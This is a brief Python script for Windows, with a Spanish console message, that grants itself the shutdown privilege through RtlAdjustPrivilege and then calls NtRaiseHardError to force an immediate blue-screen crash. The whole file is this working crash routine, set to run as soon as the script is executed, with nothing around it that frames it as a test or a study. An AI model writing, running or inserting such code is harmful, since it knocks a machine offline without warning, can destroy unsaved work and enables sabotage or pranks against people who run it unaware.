import ctypes
import os

def trigger_win11_bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))

    response = ctypes.c_uint()
    
    print("Ejecutando llamada directa al Kernel... Adiós Windows.")
    
    ctypes.windll.ntdll.NtRaiseHardError(
        0xC0000022, 
        0,          
        0,          
        0,          
        6,          
        ctypes.byref(response)
    )

if __name__ == "__main__":
    trigger_win11_bsod()
